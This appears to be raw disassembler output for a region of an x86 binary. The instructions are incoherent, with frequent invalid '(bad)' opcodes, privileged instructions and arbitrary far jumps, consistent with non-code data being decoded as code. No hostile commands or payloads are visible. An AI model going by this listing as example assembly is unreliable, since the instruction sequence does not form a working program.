  41f768:	adc    BYTE PTR [edx-0x56],0x51
  41f76c:	cmp    eax,0xb7a172b7
  41f771:	sub    al,0xab
  41f773:	mov    ds:0xf35abc9,al
  41f778:	dec    ecx
  41f779:	sub    al,0x9b
  41f77b:	sub    bh,BYTE PTR [esi+0x7f1ae4e5]
  41f781:	or     edi,ecx
  41f783:	rcl    DWORD PTR [ebp+0x50],1
  41f786:	bound  ecx,QWORD PTR [ebx-0x45]
  41f789:	push   es
  41f78a:	iret   
  41f78b:	sub    ch,BYTE PTR [ecx+0x63636cb1]
  41f791:	(bad)  
  41f793:	cdq    
  41f794:	add    cx,WORD PTR [ebp-0x66]
  41f798:	pop    ebp
  41f799:	pop    ecx
  41f79a:	(bad)  
  41f79b:	arpl   WORD PTR [edi+0x64],cx
  41f79e:	mulps  xmm2,xmm1
  41f7a1:	inc    ebx
  41f7a2:	fcmovbe st,st(7)
  41f7a4:	ret    
  41f7a5:	inc    ebx
  41f7a6:	mov    esi,DWORD PTR [ebp-0x66ee5963]
  41f7ac:	mov    ebx,0x321a2da9
  41f7b1:	fcompp 
  41f7b3:	mov    al,ds:0xd34d7dad
  41f7b8:	and    eax,0x17bf1ffd
  41f7bd:	cmp    ebx,edx
  41f7bf:	mov    ebp,0x77cc6f8a
  41f7c4:	adc    cl,BYTE PTR [ebx]
  41f7c6:	pop    ss
  41f7c7:	lds    edi,FWORD PTR [eax]
  41f7c9:	hlt    
  41f7ca:	imul   esi,DWORD PTR [esi],0x9a7925b2
  41f7d0:	xchg   esi,eax
  41f7d1:	push   ds
  41f7d2:	jns    0x41f813
  41f7d4:	pop    eax
  41f7d5:	mov    WORD PTR [ecx+0x51502d4],?
  41f7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7dc:	mov    cs,edx
  41f7de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7df:	sbb    eax,0x933ce9f5
  41f7e4:	xchg   esp,eax
  41f7e5:	std    
  41f7e6:	(bad)
  41f7ea:	cs icebp 
  41f7ec:	scas   al,BYTE PTR es:[edi]
  41f7ed:	pop    ebx
  41f7ee:	pushf  
  41f7ef:	jne    0x41f7a3
  41f7f1:	pop    ecx
  41f7f2:	mov    bh,0x1c
  41f7f4:	(bad)  
  41f7f6:	dec    esp
  41f7f7:	lock cmp cl,dl
  41f7fa:	enter  0x9db1,0x4f
  41f7fe:	and    ebp,DWORD PTR [edi]
  41f800:	scas   al,BYTE PTR es:[edi]
  41f801:	das    
  41f802:	sub    eax,0x1f424c71
  41f807:	daa    
  41f808:	inc    edi
  41f809:	stc    
  41f80a:	fsub   QWORD PTR [ebp+0x52]
  41f80d:	adc    al,0x97
  41f80f:	xchg   edx,eax
  41f810:	add    BYTE PTR [ecx+eiz*4],dl
  41f813:	or     bl,BYTE PTR [ebx]
  41f815:	and    BYTE PTR [ecx],0x7e
  41f818:	mov    eax,0x717ac919
  41f81d:	jmp    0xd783:0x341400bf
  41f824:	cmp    eax,0x5e752a15
  41f829:	inc    ebp
  41f82a:	xchg   ecx,eax
  41f82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f82c:	fwait
  41f82d:	xchg   edi,eax
  41f82e:	mov    dl,0xd6
  41f830:	pop    ebx
  41f831:	sti    
  41f832:	pushf  
  41f833:	ins    BYTE PTR es:[edi],dx
  41f834:	pop    ebp
	...
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    ebp,DWORD PTR [ecx-0x4f]
  41f8a4:	inc    ebx
  41f8a5:	xchg   ebp,eax
  41f8a6:	push   ecx
  41f8a7:	dec    esi
  41f8a8:	add    DWORD PTR [eax],eax
  41f8aa:	pop    es
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    BYTE PTR [esi+0x33],ah
  41f8b0:	inc    ecx
  41f8b1:	sbb    al,BYTE PTR [ebp-0x808b529]
  41f8b7:	push   ecx
  41f8b8:	push   0x21e42da7
  41f8bd:	mov    eax,0x1e3c7987
  41f8c2:	iret   
  41f8c3:	lahf   
  41f8c4:	scas   eax,DWORD PTR es:[edi]
  41f8c5:	into   
  41f8c6:	and    dl,bh
  41f8c8:	popa   
  41f8c9:	stos   DWORD PTR es:[edi],eax
  41f8ca:	stc    
  41f8cb:	adc    eax,0xaa8e869d
  41f8d0:	xchg   DWORD PTR [ebp-0x3f],ebp
  41f8d3:	mov    al,0xae
  41f8d5:	mov    ebx,0x2a353800
  41f8da:	sub    BYTE PTR [eax-0x71eb69ff],dl
  41f8e0:	xchg   edi,eax
  41f8e1:	xchg   edx,eax
  41f8e2:	push   ebp
  41f8e3:	rol    DWORD PTR [eax-0x44f10ac4],cl
  41f8e9:	mov    eax,ds:0x2bb2c811
  41f8ee:	fs and edi,ecx
  41f8f1:	pushf  
  41f8f2:	stc    
  41f8f3:	std    
  41f8f4:	xchg   esi,eax
  41f8f5:	push   edx
  41f8f6:	lahf   
  41f8f7:	push   es
  41f8f8:	pop    ss
  41f8f9:	ror    DWORD PTR cs:[esp+eiz*2],0xf8
  41f8fe:	add    eax,0xb5c82dbd
  41f903:	in     eax,0xca
  41f905:	jnp    0x41f8e1
  41f907:	add    eax,0xd22af52b
  41f90c:	rcl    DWORD PTR [eax-0x5ad90d06],cl
  41f912:	ret    0x1232
  41f915:	(bad)
  41f918:	imul   eax,DWORD PTR [edi+edx*1-0x48fae00a],0x2b
  41f920:	outs   dx,BYTE PTR ds:[esi]
  41f921:	iret   
  41f922:	adc    eax,0x53cd42b3
  41f927:	mov    ds:0x3d855c1a,eax
  41f92c:	std    
  41f92d:	test   al,0xe3
  41f92f:	sub    bl,0x7a
  41f932:	mov    ds:0xaa76dfc7,al
  41f937:	dec    esp
  41f938:	or     BYTE PTR [ebp-0x8],ch
  41f93b:	clc    
  41f93c:	imul   eax,eax,0xc0630311
  41f942:	push   ss
  41f943:	cld    
  41f944:	call   0x742b7fe9
  41f949:	(bad)  
  41f94a:	int    0x50
  41f94c:	js     0x41f8ee
  41f94e:	inc    dh
  41f950:	test   DWORD PTR [edi+edx*4+0x6ea570c2],ecx
  41f957:	ffree  st(7)
  41f959:	mov    esi,0xaa578ce4
  41f95e:	nop
  41f95f:	jbe    0x41f914
  41f961:	push   0xffffffd3
  41f963:	dec    ebp
  41f964:	mov    eax,DWORD PTR [eax]
  41f966:	jbe    0x41f8f3
  41f968:	inc    esi
  41f969:	jecxz  0x41f92a
  41f96b:	(bad)  
  41f96c:	gs jmp 0x6ec1:0x1a45ab0b
  41f974:	adc    esp,edi
  41f976:	inc    ebp
  41f977:	ficom  WORD PTR [ebx]
  41f979:	retf   0x4239
  41f97c:	fisubr WORD PTR [esi]
  41f97e:	mov    DWORD PTR [ecx+0x21],eax
  41f981:	shl    BYTE PTR [esi],0xe0
  41f984:	mov    esi,0x888731
  41f989:	(bad)
  41f98c:	jge    0x41f972
  41f98e:	js     0x41f960
  41f990:	dec    ebp
  41f991:	add    esp,DWORD PTR [edx]
  41f993:	idiv   DWORD PTR [edi-0x3775645e]
  41f999:	pop    ds
  41f99a:	lock add DWORD PTR [ecx],esi
  41f99d:	nop
  41f99e:	shl    DWORD PTR [ecx-0x3f],0x69
  41f9a2:	iret   
  41f9a3:	out    dx,al
  41f9a4:	fist   DWORD PTR [edi]
  41f9a6:	pop    ecx
  41f9a7:	mov    eax,0x2f9da64f
  41f9ac:	out    0xe5,al
  41f9ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9af:	nop
  41f9b0:	ins    BYTE PTR es:[edi],dx
  41f9b1:	cmp    BYTE PTR [ecx+0x772e],ah
	...
  41fa13:	add    BYTE PTR [eax],al
  41fa15:	add    BYTE PTR [edx],cl
  41fa17:	inc    ecx
  41fa18:	mov    bh,0xa1
  41fa1a:	push   edi
  41fa1c:	push   ds
  41fa1d:	jmp    0x41f9ba
  41fa1f:	mov    eax,0x1cfe8e70
  41fa24:	xchg   edi,eax
  41fa25:	dec    ecx
  41fa26:	pop    eax
  41fa27:	dec    edi
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    BYTE PTR [eax+0x4f],dh
  41fa30:	in     eax,dx
  41fa31:	mov    ebx,0x5b467c74
  41fa36:	into   
  41fa37:	call   0x34ea8c7a
  41fa3c:	or     ah,al
  41fa3e:	sub    DWORD PTR [eax],ecx
  41fa40:	(bad)  
  41fa41:	repz dec ebp
  41fa43:	test   al,0x3
  41fa45:	sub    al,0x1b
  41fa47:	cmp    DWORD PTR [ebx-0x77],eax
  41fa4a:	cli    
  41fa4b:	dec    DWORD PTR [ecx]
  41fa4d:	stos   DWORD PTR es:[edi],eax
  41fa4e:	imul   esp,DWORD PTR [edi],0x44
  41fa51:	sbb    eax,0x111832cd
  41fa56:	cmp    al,0x58
  41fa58:	cmp    al,0xaa
  41fa5a:	xor    BYTE PTR [edi+0x18],dl
  41fa5d:	out    0x4a,eax
  41fa5f:	adc    bl,bh
  41fa61:	sbb    al,0xa3
  41fa63:	into   
  41fa64:	cmp    DWORD PTR [eax+0x209f3b],ebx
  41fa6a:	push   eax
  41fa6b:	addr16 test ebp,ebx
  41fa6e:	lods   eax,DWORD PTR ds:[esi]
  41fa6f:	fadd   QWORD PTR [edx+0x2424afd2]
  41fa75:	in     al,0x1d
  41fa77:	out    dx,eax
  41fa78:	pop    ss
  41fa79:	bound  ecx,QWORD PTR [ebx+0x69]
  41fa7c:	xchg   ecx,eax
  41fa7d:	pop    ebx
  41fa7e:	push   ebp
  41fa7f:	xchg   esp,eax
  41fa80:	(bad)  
  41fa82:	or     DWORD PTR [eax],ebp
  41fa84:	mov    al,ds:0x2a7b09d6
  41fa89:	mov    gs,WORD PTR [edi-0xa19b93a]
  41fa8f:	ins    DWORD PTR es:[edi],dx
  41fa90:	retf   0x5dd1
  41fa93:	add    DWORD PTR [esi],ebx
  41fa95:	adc    ah,BYTE PTR [eax]
  41fa97:	int    0xab
  41fa99:	imul   esp,DWORD PTR [esi-0x28],0x46b2fab7
  41faa0:	push   edi
  41faa1:	dec    eax
  41faa2:	into   
  41faa3:	push   ds
  41faa4:	fs and edi,esi
  41faa7:	jmp    0x9c1b:0xe05c65e8
  41faae:	shr    BYTE PTR [ebp-0xc5313b8],cl
  41fab4:	fnstsw WORD PTR [esi]
  41fab6:	push   ss
  41fab7:	inc    ecx
  41fab8:	test   eax,0xc4409ac7
  41fabd:	mov    cs,edx
  41fabf:	hlt    
  41fac0:	retf   
  41fac1:	(bad)  
  41fac2:	int3   
  41fac3:	test   al,0xea
  41fac5:	je     0x41fb0a
  41fac7:	adc    cl,BYTE PTR [ebp+0x28b35e22]
  41facd:	xchg   ebp,eax
  41face:	inc    ecx
  41facf:	inc    edx
  41fad0:	out    0xfc,eax
  41fad2:	xchg   ebx,eax
  41fad3:	mov    eax,ds:0xa56a0f36
  41fad8:	sti    
  41fad9:	fwait
  41fada:	dec    dx
  41fadc:	xor    eax,0x1ae956a9
  41fae1:	dec    esp
  41fae2:	and    eax,0x750fb46a
  41fae7:	xchg   ebp,eax
  41fae8:	jle    0x41fb60
  41faea:	test   BYTE PTR [ecx+0x68],al
  41faed:	scas   al,BYTE PTR es:[edi]
  41faee:	add    bl,BYTE PTR [eax+0x28995f1c]
  41faf4:	out    0x29,al
  41faf6:	rcr    BYTE PTR [edx],cl
  41faf8:	xchg   esp,eax
  41faf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fafa:	or     DWORD PTR ss:[edi],ebp
  41fafd:	jne    0x41fa83
  41faff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb00:	mov    ecx,0xb790f265
  41fb05:	jl     0x41fb69
  41fb07:	das    
  41fb08:	jecxz  0x41fad8
  41fb0a:	sbb    BYTE PTR [edx-0x2728e2c7],ah
  41fb10:	jbe    0x41fb5c
  41fb12:	push   edx
  41fb13:	lds    edi,FWORD PTR [eax+0x2d]
  41fb16:	dec    eax
  41fb17:	ss scas al,BYTE PTR es:[edi]
  41fb19:	cmp    ecx,DWORD PTR ds:0x8a074d52
  41fb1f:	mov    al,ds:0xee2931b9
  41fb24:	jmp    0x931c:0x4ec84927
  41fb2b:	pop    esi
  41fb2c:	and    eax,0x7f4e274
  41fb31:	cmp    ecx,DWORD PTR [eax]
  41fb33:	xor    DWORD PTR [ebp+0x0],edi
	...
  41fb96:	fsubr  QWORD PTR [eax]
  41fb98:	mov    ah,ah
  41fb9a:	(bad)  
  41fb9b:	out    0xfe,al
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0xe3
  41fba3:	xchg   BYTE PTR [edi],al
  41fba5:	mov    edi,0x1505f
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    BYTE PTR [eax-0x5823a9a],bl
  41fbb3:	addr16 into 
  41fbb5:	mov    ecx,0xe1a93f57
  41fbba:	aad    0xfd
  41fbbc:	fstp   QWORD PTR [ecx-0x3b]
  41fbbf:	inc    ebp
  41fbc0:	out    dx,eax
  41fbc1:	leave  
  41fbc2:	cld    
  41fbc3:	mov    fs,WORD PTR [ecx+ebp*1+0x72]
  41fbc7:	pop    esp
  41fbc8:	xchg   esp,eax
  41fbc9:	hlt    
  41fbca:	lods   al,BYTE PTR ds:[esi]
  41fbcb:	sub    dh,bh
  41fbcd:	mov    al,0xcf
  41fbcf:	cmp    DWORD PTR [ecx],ebp
  41fbd1:	mov    eax,ds:0xd9c087d9
  41fbd6:	aas    
  41fbd7:	or     DWORD PTR [edi+0x3e29dc0c],ecx
  41fbdd:	sub    al,0x59
  41fbdf:	stc    
  41fbe0:	mov    ecx,DWORD PTR [edi+0x3703948f]
  41fbe6:	(bad)  
  41fbe7:	sub    DWORD PTR [edi-0x7d],ebx
  41fbea:	and    al,0x3e
  41fbec:	inc    ecx
  41fbed:	outs   dx,DWORD PTR ds:[si]
  41fbef:	fcmovb st,st(7)
  41fbf1:	lock add DWORD PTR [ecx-0x1f],0xfa13d65d
  41fbf9:	dec    eax
  41fbfa:	dec    ecx
  41fbfb:	pop    ecx
  41fbfc:	std    
  41fbfd:	xor    al,0x85
  41fbff:	sbb    esi,DWORD PTR [edi]
  41fc01:	out    dx,al
  41fc02:	lds    eax,FWORD PTR [ecx-0x68]
  41fc05:	out    dx,al
  41fc06:	jle    0x41fc78
  41fc08:	loopne 0x41fba1
  41fc0a:	cmp    al,0x89
  41fc0c:	imul   esp,edx,0xddd73d59
  41fc12:	push   ds
  41fc13:	dec    esp
  41fc14:	mov    DWORD PTR [ecx+edx*4-0x43],edi
  41fc18:	pop    es
  41fc19:	icebp  
  41fc1a:	mov    edi,0x9ac39664
  41fc1f:	xor    eax,0x9164e268
  41fc24:	test   DWORD PTR [edx-0x75],esi
  41fc27:	mov    WORD PTR [edi],fs
  41fc29:	lahf   
  41fc2a:	aas    
  41fc2b:	push   es
  41fc2c:	jge    0x41fbec
  41fc2e:	jb     0x41fbe9
  41fc30:	add    esi,DWORD PTR [ecx+esi*1+0x2b]
  41fc34:	sti    
  41fc35:	aas    
  41fc36:	pop    ds
  41fc37:	or     eax,0xde5d2761
  41fc3c:	xor    al,BYTE PTR [eax]
  41fc3e:	mov    bh,0x25
  41fc40:	(bad)
  41fc44:	cwde   
  41fc45:	sar    DWORD PTR [eax+0x3ec23afd],0xa2
  41fc4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc4d:	push   ds
  41fc4e:	cdq    
  41fc4f:	pop    esi
  41fc50:	mul    BYTE PTR [edi-0x12efd117]
  41fc56:	adc    edi,DWORD PTR [ebx-0x39]
  41fc59:	xor    al,BYTE PTR [ebx]
  41fc5b:	mov    ds:0xce0ba062,eax
  41fc60:	fwait
  41fc61:	cmp    BYTE PTR [esp+ebp*1+0x2b],al
  41fc65:	ins    DWORD PTR es:[edi],dx
  41fc66:	fimul  WORD PTR [ebx+0x1c57f9b2]
  41fc6c:	push   eax
  41fc6d:	shl    ch,0x4c
  41fc70:	or     eax,0xe42c8788
  41fc75:	push   ss
  41fc76:	sbb    eax,0x3504fe4b
  41fc7b:	jmp    0x41fc4e
  41fc7d:	les    edx,FWORD PTR [edi+0x71]
  41fc80:	mov    dl,0x94
  41fc82:	aam    0x8d
  41fc84:	loope  0x41fc83
  41fc86:	lods   eax,DWORD PTR ds:[esi]
  41fc87:	getsec 
  41fc89:	imul   eax,DWORD PTR [ebp-0x3ecf2d99],0xce1e152c
  41fc93:	xchg   edx,eax
  41fc94:	jae    0x41fcc8
  41fc96:	into   
  41fc97:	ss pop es
  41fc99:	pop    ss
  41fc9a:	push   0x7c41be77
  41fc9f:	std    
  41fca0:	sbb    ch,ch
  41fca2:	xlat   BYTE PTR ds:[ebx]
  41fca3:	call   0xca8a:0x7fb7052f
  41fcaa:	les    esp,FWORD PTR [ebx-0x7a]
  41fcad:	out    dx,al
  41fcae:	cmp    bh,ch
  41fcb0:	in     al,0xc6
  41fcb2:	std    
  41fcb3:	push   esi
  41fcb4:	xor    eax,0x0
	...
  41fd15:	add    BYTE PTR [edx+ebp*2],cl
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	mov    ch,BYTE PTR [ecx+0x51667938]
  41fd28:	add    DWORD PTR [eax],eax
  41fd2a:	pop    es
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    BYTE PTR [edx+edx*1+0x1f],cl
  41fd31:	mov    esi,0xda308aa5
  41fd36:	fwait
  41fd37:	mov    ah,0xda
  41fd39:	mov    edx,0x4a71b02c
  41fd3e:	in     al,dx
  41fd3f:	es out 0x25,al
  41fd42:	xor    al,0xba
  41fd44:	dec    eax
  41fd45:	rcl    esp,1
  41fd47:	mov    eax,ds:0x3ceed4ce
  41fd4c:	xchg   edi,eax
  41fd4d:	pop    esp
  41fd4e:	mov    dl,0xa4
  41fd50:	add    DWORD PTR [ecx+0x159f98b9],0xffffffd9
  41fd57:	cdq    
  41fd58:	and    dl,cl
  41fd5a:	sahf   
  41fd5b:	mov    ch,BYTE PTR [ebp+0x1]
  41fd5e:	or     edi,DWORD PTR [ebx+0x48]
  41fd61:	mov    ch,0x21
  41fd63:	xor    ch,BYTE PTR [edx-0x5daef9bc]
  41fd69:	push   0x7a
  41fd6b:	sub    eax,0xccbd7c54
  41fd70:	popa   
  41fd71:	mov    esp,0x28141d83
  41fd76:	shr    BYTE PTR ds:0xa75ca9b5,0xed
  41fd7d:	shr    eax,cl
  41fd7f:	jecxz  0x41fd97
  41fd81:	repnz mov dl,0xf5
  41fd84:	inc    edi
  41fd85:	xor    bl,BYTE PTR [ebx+edi*8]
  41fd88:	scas   eax,DWORD PTR es:[edi]
  41fd89:	data16 jne 0x41fd63
  41fd8c:	xchg   DWORD PTR [esi+0x51],edx
  41fd8f:	pop    ebp
  41fd90:	xor    ebx,ecx
  41fd92:	cmp    eax,DWORD PTR [edi+0x343ad677]
  41fd98:	inc    ebp
  41fd99:	and    DWORD PTR [ebx],0xa7c18f6d
  41fd9f:	imul   DWORD PTR [ebp+0x61a04352]
  41fda5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fda6:	mov    ecx,ecx
  41fda8:	pop    edi
  41fda9:	fisub  DWORD PTR [esi+ebp*4-0x32]
  41fdad:	clc    
  41fdae:	xchg   BYTE PTR [esp+ecx*4],bh
  41fdb1:	fisubr DWORD PTR [esi-0x53]
  41fdb4:	lods   eax,DWORD PTR ds:[esi]
  41fdb5:	xchg   ebx,eax
  41fdb6:	adc    BYTE PTR [esi+0x58],bl
  41fdb9:	test   al,0x29
  41fdbc:	lahf   
  41fdbd:	leave  
  41fdbe:	dec    esi
  41fdbf:	lock mov ah,0x7b
  41fdc2:	int3   
  41fdc3:	mov    ecx,0x17155f98
  41fdc8:	xor    al,0x32
  41fdca:	bound  edx,QWORD PTR [ecx-0xf]
  41fdcd:	mov    eax,0x275530b2
  41fdd2:	stos   BYTE PTR es:[edi],al
  41fdd3:	jmp    0x41fd59
  41fdd5:	xor    ch,dh
  41fdd7:	jge    0x41fd5c
  41fdd9:	mov    fs,WORD PTR [eax+0x34]
  41fddc:	jbe    0x41fdf0
  41fdde:	call   0xb3d2ee52
  41fde3:	push   esp
  41fde4:	out    0xd,eax
  41fde6:	mov    ah,0xa4
  41fde8:	xchg   ecx,eax
  41fde9:	and    al,0xbc
  41fdeb:	inc    edx
  41fdec:	popf   
  41fded:	sti    
  41fdee:	sahf   
  41fdef:	imul   eax,DWORD PTR [edx+0x27e18662],0xffffffe2
  41fdf6:	or     DWORD PTR [ecx],esp
  41fdf8:	push   cs
  41fdf9:	mov    ch,0x96
  41fdfb:	ja     0x41fe51
  41fdfd:	outs   dx,DWORD PTR ds:[esi]
  41fdff:	sti    
  41fe00:	mov    al,0xac
  41fe02:	ss pop es
  41fe04:	xchg   edi,eax
  41fe05:	jle    0x41fe15
  41fe07:	xchg   DWORD PTR [edi+0xd],esp
  41fe0a:	mov    bh,0xa3
  41fe0c:	push   ebx
  41fe0d:	jo     0x41fe12
  41fe0f:	add    DWORD PTR [edi-0x435e249b],0xb1328a34
  41fe19:	inc    esp
  41fe1a:	push   ecx
  41fe1b:	test   bl,ch
  41fe1d:	mov    ds:0xd363629a,al
  41fe22:	push   edx
  41fe23:	aam    0xe6
  41fe25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe26:	stc    
  41fe27:	jl     0x41fe48
  41fe29:	ret    0x7f8f
  41fe2c:	fadd   DWORD PTR [ebx]
  41fe2e:	sub    ecx,DWORD PTR [ebx]
  41fe30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe31:	pop    ebx
  41fe32:	(bad)  
  41fe33:	push   ss
  41fe34:	and    DWORD PTR [eax],eax
	...
  41fe96:	stos   BYTE PTR es:[edi],al
  41fe97:	push   ebp
  41fe98:	call   0x515d:0xffefffe7
  41fe9f:	lock xor DWORD PTR [edi+0x78],0x5d
  41fea4:	pop    eax
  41fea5:	mov    al,0x6d
  41fea7:	push   edx
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [ebx-0x6c],dl
  41feb0:	push   ebp
  41feb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb2:	add    dl,ah
  41feb4:	outs   dx,BYTE PTR ds:[esi]
  41feb5:	jne    0x41ff1f
  41feb7:	pop    eax
  41feb8:	push   ebp
  41feb9:	fisub  WORD PTR [ebp-0x40]
  41febc:	dec    eax
  41febd:	cmp    bl,dh
  41febf:	mov    ch,0x48
  41fec1:	cmc    
  41fec2:	out    0x60,eax
  41fec4:	mov    eax,0x61553b03
  41fec9:	jecxz  0x41ff15
  41fecb:	pop    ss
  41fecc:	fldln2 
  41fece:	mov    ds,WORD PTR [ebx+ebp*8-0x1f]
  41fed2:	dec    edx
  41fed3:	ins    DWORD PTR es:[edi],dx
  41fed4:	test   eax,0x6db7515f
  41fed9:	xchg   esi,eax
  41feda:	add    edi,DWORD PTR [edx-0x6e]
  41fedd:	sahf   
  41fede:	(bad)  
  41fedf:	and    eax,0xcfe30454
  41fee4:	xchg   esi,eax
  41fee5:	(bad)  
  41fee7:	call   0xacc34f8c
  41feec:	jg     0xc0eaea46
  41fef2:	pop    ss
  41fef3:	std    
  41fef4:	gs cs jl 0x41fedf
  41fef8:	test   esi,edx
  41fefa:	into   
  41fefb:	pop    ss
  41fefc:	push   eax
  41fefd:	sub    ch,ah
  41feff:	adc    BYTE PTR [eax+0x42],ch
  41ff02:	cwde   
  41ff03:	xchg   ecx,eax
  41ff04:	cmp    ah,BYTE PTR [ebp-0x5e7860cc]
  41ff0a:	clc    
  41ff0b:	pop    ebx
  41ff0c:	neg    BYTE PTR [esp+eiz*2]
  41ff0f:	jmp    0x4fde20d8
  41ff14:	mov    eax,ds:0xa83febe6
  41ff19:	and    eax,0x809e8bb3
  41ff1e:	aam    0xa8
  41ff20:	mov    al,0x4a
  41ff22:	inc    esi
  41ff23:	add    DWORD PTR [edx+0x425657aa],eax
  41ff29:	xchg   DWORD PTR [edi+0x4e],esi
  41ff2c:	cmp    dh,0xd
  41ff2f:	lsl    esp,WORD PTR [ebx]
  41ff32:	test   eax,0x9eadca6e
  41ff37:	pop    edx
  41ff38:	mov    ebp,0x8c1b162a
  41ff3d:	cmc    
  41ff3e:	xor    DWORD PTR [esi],eax
  41ff40:	es sbb eax,0x485c1fcb
  41ff46:	mov    esp,0x8fbe717
  41ff4b:	xchg   ecx,edi
  41ff4d:	outs   dx,DWORD PTR ds:[esi]
  41ff4e:	push   0x81e2d08
  41ff53:	ret    0x8871
  41ff56:	push   esp
  41ff57:	add    DWORD PTR [esp+esi*2-0x6a],0x63
  41ff5c:	rcr    dh,1
  41ff5e:	and    al,0xd3
  41ff60:	adc    esi,DWORD PTR [ebx-0x68450176]
  41ff66:	jecxz  0x41ffbc
  41ff68:	popf   
  41ff69:	jmp    0x7481:0x8602b57f
  41ff70:	imul   ebp,DWORD PTR [edi+ebx*8],0xfffffff3
  41ff74:	mov    WORD PTR [edi+ebx*4],cs
  41ff77:	scas   eax,DWORD PTR es:[edi]
  41ff78:	add    al,bl
  41ff7a:	pop    ecx
  41ff7b:	inc    ecx
  41ff7c:	xchg   esi,eax
  41ff7d:	cmc    
  41ff7e:	stc    
  41ff7f:	add    eax,0xe76930c7
  41ff84:	pop    edi
  41ff85:	adc    cl,BYTE PTR [eax+0x59]
  41ff88:	pushf  
  41ff89:	pop    ebp
  41ff8a:	or     eax,0xad3ab0ef
  41ff8f:	xor    DWORD PTR [edi-0x7c],esp
  41ff92:	jo     0x41ffd1
  41ff94:	jb     0x41ff93
  41ff96:	adc    BYTE PTR [edi-0x36],ch
  41ff99:	adc    bl,ch
  41ff9b:	jmp    0x956b:0x196e3f5c
  41ffa2:	je     0x41ffc9
  41ffa4:	push   0x36
  41ffa6:	dec    ebx
  41ffa7:	iret   
  41ffa8:	and    bl,0xe2
  41ffab:	js     0x41ff49
  41ffad:	push   0xbb135267
  41ffb2:	jg     0x41ffa5
  41ffb4:	cmp    al,BYTE PTR [eax]
	...
  420016:	bound  esp,QWORD PTR [ebp-0x8808a]
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0x78
  420023:	or     eax,0x5374b0ea
  420028:	add    DWORD PTR [eax],eax
  42002a:	pop    es
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [esi-0x5976742b],bh
  420033:	fs and bh,cl
  420036:	imul   ebp,DWORD PTR [eax-0x42],0xffffffe3
  42003a:	pop    ss
  42003b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42003c:	inc    eax
  42003d:	frstor [edx-0x45]
  420040:	push   esi
  420041:	xchg   ebp,eax
  420042:	jo     0x4200b1
  420044:	jbe    0x420060
  420046:	adc    edi,DWORD PTR [edi-0x7682c700]
  42004c:	sub    bh,BYTE PTR [edi+0x20]
  42004f:	jge    0x420090
  420051:	int    0xfa
  420053:	out    dx,eax
  420054:	hlt    
  420055:	mov    ebx,0x86f3d84b
  42005a:	jecxz  0x4200be
  42005c:	push   esp
  42005d:	adc    BYTE PTR [ebx+0x1],al
  420060:	sbb    dh,BYTE PTR [eax]
  420062:	adc    DWORD PTR [edi+edx*4],ebp
  420065:	adc    al,0xb3
  420067:	bound  esi,QWORD PTR [esp+ebp*8+0x548f5260]
  42006e:	jno    0x42001c
  420070:	lahf   
  420071:	or     al,0xf1
  420073:	and    BYTE PTR [ebp+0x12ca30e5],al
  420079:	push   edi
  42007a:	add    al,bl
  42007c:	mov    edi,0x41b54f7
  420081:	ret    0xf5e2
  420084:	test   BYTE PTR [eax],cl
  420086:	pop    eax
  420087:	jne    0x4200db
  420089:	jns    0x42008f
  42008b:	(bad)  
  42008c:	sub    eax,0x8d7c25a1
  420091:	mov    dl,0x6f
  420093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420094:	popa   
  420095:	mov    ds:0x14fbfcb,al
  42009a:	mov    ah,0xa7
  42009c:	fild   QWORD PTR ds:0x1232bcd0
  4200a2:	popf   
  4200a3:	in     eax,dx
  4200a4:	ret    0x9105
  4200a7:	sahf   
  4200a8:	(bad)  
  4200a9:	test   ebp,0xb565943f
  4200af:	xchg   ecx,eax
  4200b0:	cdq    
  4200b1:	loope  0x4200f0
  4200b3:	pop    ebp
  4200b4:	inc    eax
  4200b5:	add    esi,DWORD PTR [edx]
  4200b7:	je     0x420120
  4200b9:	icebp  
  4200ba:	xor    al,0x69
  4200bc:	hlt    
  4200bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200be:	push   eax
  4200bf:	mov    ds:0xf7111591,eax
  4200c4:	fistp  DWORD PTR [ebp-0x2c1f963d]
  4200ca:	mov    BYTE PTR [esi+0x41],ah
  4200cd:	lods   eax,DWORD PTR ds:[esi]
  4200ce:	outs   dx,DWORD PTR ds:[esi]
  4200cf:	mov    ds:0xd6818192,al
  4200d4:	and    ebx,DWORD PTR es:[esi+0x5d8f2ef0]
  4200db:	cmp    dl,BYTE PTR [ecx]
  4200dd:	out    dx,al
  4200de:	sbb    al,0x65
  4200e0:	test   eax,0x35a950c6
  4200e5:	push   esp
  4200e6:	push   edi
  4200e7:	add    BYTE PTR [esi+0x18],0x4b
  4200eb:	and    eax,0x5940f157
